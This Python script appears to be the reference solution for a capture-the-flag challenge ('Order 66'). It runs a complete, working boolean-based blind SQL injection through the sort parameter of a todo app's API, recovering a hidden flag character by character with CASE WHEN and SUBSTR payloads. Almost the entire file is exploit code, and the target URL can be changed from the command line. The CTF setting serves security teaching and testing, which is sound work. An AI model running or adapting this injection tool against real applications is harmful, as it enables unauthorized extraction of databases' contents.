#!/usr/bin/env python3
"""
Order 66 CTF Challenge - Reference Solution
==========================================

This script demonstrates how to exploit the SQL injection vulnerability
in the todo application's sort parameter to extract the flag.

Author: CTF Challenge Creator
Target: http://localhost:8000/api/todos?sort=[PAYLOAD]
Vulnerability: ORDER BY SQL Injection (Boolean-based blind)
"""

import requests
import string
import sys
from time import sleep

class Order66Exploiter:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.api_url = f"{base_url}/api/todos"
        self.flag = ""
        self.charset = string.ascii_uppercase + string.digits + "{}_"
        
    def test_connection(self):
        """Test if the target is accessible"""
        try:
            response = requests.get(f"{self.base_url}/api/health")
            if response.status_code == 200:
                print("✅ Target is accessible")
                return True
        except Exception as e:
            print(f"❌ Cannot connect to target: {e}")
            return False
    
    def test_vulnerability(self):
        """Test if the sort parameter is vulnerable"""
        print("\n🔍 Testing for SQL injection vulnerability...")
        
        # Test with invalid column - should generate error
        try:
            response = requests.get(f"{self.api_url}?sort=invalid_column_name")
            if "Invalid sort column" in response.text or response.status_code == 400:
                print("✅ Vulnerability confirmed - error-based response detected")
                return True
        except:
            pass
            
        # Test with conditional payload
        try:
            payload1 = "(CASE WHEN 1=1 THEN created_at ELSE priority END)"
            payload2 = "(CASE WHEN 1=2 THEN created_at ELSE priority END)"
            
            response1 = requests.get(f"{self.api_url}?sort={payload1}")
            response2 = requests.get(f"{self.api_url}?sort={payload2}")
            
            if response1.status_code == 200 and response2.status_code == 200:
                # Compare the order of results
                todos1 = response1.json().get('todos', [])
                todos2 = response2.json().get('todos', [])
                
                if len(todos1) > 0 and len(todos2) > 0:
                    if todos1[0]['id'] != todos2[0]['id']:
                        print("✅ Boolean-based blind injection confirmed - different sort orders detected")
                        return True
                        
        except Exception as e:
            print(f"⚠️  Error testing payloads: {e}")
            
        print("❌ Vulnerability not confirmed")
        return False
        
    def discover_tables(self):
        """Discover if flags table exists"""
        print("\n🔍 Checking for flags table...")
        
        # Test if flags table exists using boolean condition
        payload = "(CASE WHEN (SELECT COUNT(*) FROM flags) > 0 THEN created_at ELSE priority END)"
        
        try:
            response = requests.get(f"{self.api_url}?sort={payload}")
            if response.status_code == 200:
                print("✅ Flags table exists and contains data")
                return True
        except:
            pass
            
        print("❌ Flags table not found or empty")
        return False
    
    def get_flag_length(self):
        """Determine the length of the flag"""
        print("\n📏 Determining flag length...")
        
        for length in range(1, 100):
            payload = f"(CASE WHEN (SELECT LENGTH(flag_value) FROM flags LIMIT 1) = {length} THEN created_at ELSE priority END)"
            
            try:
                response = requests.get(f"{self.api_url}?sort={payload}")
                if response.status_code == 200:
                    # Get baseline response (false condition)
                    baseline_payload = f"(CASE WHEN 1=2 THEN created_at ELSE priority END)"
                    baseline_response = requests.get(f"{self.api_url}?sort={baseline_payload}")
                    
                    if self._compare_responses(response, baseline_response):
                        print(f"✅ Flag length: {length} characters")
                        return length
                        
            except Exception as e:
                print(f"⚠️  Error testing length {length}: {e}")
                
        print("❌ Could not determine flag length")
        return 0
        
    def extract_flag(self, flag_length):
        """Extract the flag character by character"""
        print(f"\n🏴 Extracting flag ({flag_length} characters)...")
        flag = ""
        
        for position in range(1, flag_length + 1):
            print(f"Position {position}/{flag_length}: ", end="", flush=True)
            
            found_char = None
            for char in self.charset:
                # Test each character
                payload = f"(CASE WHEN (SELECT SUBSTR(flag_value,{position},1) FROM flags LIMIT 1)='{char}' THEN created_at ELSE priority END)"
                
                try:
                    response = requests.get(f"{self.api_url}?sort={payload}")
                    if response.status_code == 200:
                        # Get baseline response (false condition)
                        baseline_payload = f"(CASE WHEN 1=2 THEN created_at ELSE priority END)"
                        baseline_response = requests.get(f"{self.api_url}?sort={baseline_payload}")
                        
                        if self._compare_responses(response, baseline_response):
                            found_char = char
                            break
                            
                except Exception as e:
                    print(f"⚠️  Error: {e}")
                    continue
                    
                # Small delay to avoid overwhelming the server
                sleep(0.1)
            
            if found_char:
                flag += found_char
                print(f"'{found_char}' -> Current flag: {flag}")
            else:
                print("❓ (unknown character)")
                flag += "?"
                
        return flag
        
    def _compare_responses(self, response1, response2):
        """Compare two responses to detect boolean condition"""
        try:
            todos1 = response1.json().get('todos', [])
            todos2 = response2.json().get('todos', [])
            
            if len(todos1) > 0 and len(todos2) > 0:
                # Compare the first todo ID to detect different ordering
                return todos1[0]['id'] != todos2[0]['id']
                
        except:
            pass
        return False
        
    def exploit(self):
        """Main exploitation function"""
        print("🏴 Order 66 CTF Challenge - Automated Exploit")
        print("=" * 50)
        
        # Test connection
        if not self.test_connection():
            return False
            
        # Test vulnerability
        if not self.test_vulnerability():
            return False
            
        # Discover tables
        if not self.discover_tables():
            return False
            
        # Get flag length
        flag_length = self.get_flag_length()
        if flag_length == 0:
            return False
            
        # Extract flag
        flag = self.extract_flag(flag_length)
        
        print(f"\n🎉 MISSION COMPLETE!")
        print(f"🏴 Flag: {flag}")
        
        if "SKYDAYS{" in flag and flag.endswith("}"):
            print("✅ Flag format appears correct!")
        else:
            print("⚠️  Flag format may be incorrect")
            
        return True

def main():
    print("🌟 May the Force be with you... 🌟")
    
    # Allow custom target URL
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    
    exploiter = Order66Exploiter(target)
    success = exploiter.exploit()
    
    if success:
        print("\n🎯 Order 66 has been executed successfully!")
    else:
        print("\n💥 The rebellion has failed. Try again, young Padawan.")
        sys.exit(1)

if __name__ == "__main__":
    main()